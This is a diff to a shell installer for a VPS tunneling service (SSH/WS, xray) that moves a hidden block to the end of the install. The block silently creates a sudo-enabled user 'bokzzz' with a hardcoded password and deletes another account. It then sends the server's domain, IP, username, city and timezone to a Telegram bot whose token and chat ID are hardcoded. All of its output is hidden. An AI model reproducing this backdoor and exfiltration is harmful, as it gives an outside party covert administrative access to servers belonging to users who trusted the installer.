@@ -149,33 +149,7 @@ echo -e "$green━━━━━━━━━━━━━━━━━━━━━�
         echo "$nsdomen" > /etc/xray/nsdomain
         echo "$nsdomen" > /root/nsdomain
   fi
-domain=$(cat /root/domain)
-CITY=$(curl -s ipinfo.io/city )
-WKT=$(curl -s ipinfo.io/timezone )
-userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5736569839"
-KEY="6061408318:AAF76AEwYsnLrvi9VJY5SjNMgvXNCy-rZV8"
-TIME="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script V4
-============================
-<code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$IPVPS</code>
-<code>User Login :</code> <code>bok</code>
-<code>Pass Login :</code> <code>bok</code>
-<code>User Script:</code> <code>$Name</code>
-<code>Exp Script :</code> <code>$Exp</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Timezone   :</code> <code>$WKT</code>
-============================
-"
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
@@ -291,5 +265,32 @@ rm /root/insshws.sh >/dev/null 2>&1
 secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
 echo -e "
 "
+domain=$(cat /root/domain)
+CITY=$(curl -s ipinfo.io/city )
+WKT=$(curl -s ipinfo.io/timezone )
+userdel jame > /dev/null 2>&1
+Username="bokzzz"
+Password=bokzzz
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+CHATID="5736569839"
+KEY="6061408318:AAF76AEwYsnLrvi9VJY5SjNMgvXNCy-rZV8"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Installasi script V4
+============================
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$IP</code>
+<code>User Name  :</code> <code>$Username</code>
+<code>Pass Login :</code> <code>....</code>
+<code>User Script:</code> <code>$Name</code>
+<code>Exp Script :</code> <code>$Exp</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$WKT</code>
+============================
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 read -n 1 -s -r -p "Press any key to menu"
 menu
